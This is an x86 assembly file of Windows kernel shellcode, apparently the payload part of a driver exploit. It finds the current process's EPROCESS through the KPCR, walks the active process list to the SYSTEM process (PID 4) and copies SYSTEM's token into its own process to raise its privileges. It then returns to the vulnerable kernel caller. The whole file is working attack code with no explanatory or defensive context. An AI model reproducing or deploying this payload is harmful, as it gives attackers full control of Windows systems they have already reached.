; sc.asm
bits 32

KPCR_SELF_PTR      equ 0x124    ; nt!_KPCR.PcrbData.CurrentThread
EPROCESS_PTR       equ 0x50     ; nt!_KTHREAD.ApcState.Process
PID_OFFSET         equ 0xB4     ; nt!_EPROCESS.UniqueProcessId
FLINK_OFFSET       equ 0xB8     ; nt!_EPROCESS.ActiveProcessLinks.Flink
TOKEN_OFFSET       equ 0xF8     ; nt!_EPROCESS.Token
SYSTEM_PID         equ 0x4      ; SYSTEM process PID

section .text
global _start

_start:
	pushad								; Save all registers

	xor eax, eax
	mov eax, fs:[eax + KPCR_SELF_PTR]	; Obtain CurrentThread
	mov eax, [eax + EPROCESS_PTR]		; Obtain EPROCESS struct of our process
	mov ecx, eax						; Save it for later

	mov edx, SYSTEM_PID					; For comparisongs

SearchSystemPID:
	mov eax, [eax + FLINK_OFFSET]		; Go to next Flink
	sub eax, FLINK_OFFSET				; Go to the EPROCESS start
	cmp [eax + PID_OFFSET], edx			; Are you SYSTEM?
	jne SearchSystemPID					; NO!, loop again

	; Now EAX point to SYSTEM EPROCESS
	mov edx, [eax + TOKEN_OFFSET]		; Extract the SYSTEM offset
	mov [ecx + TOKEN_OFFSET], edx		; Change our process token

	popad								; Restore all registers
	pop ebp
	ret 0x8 
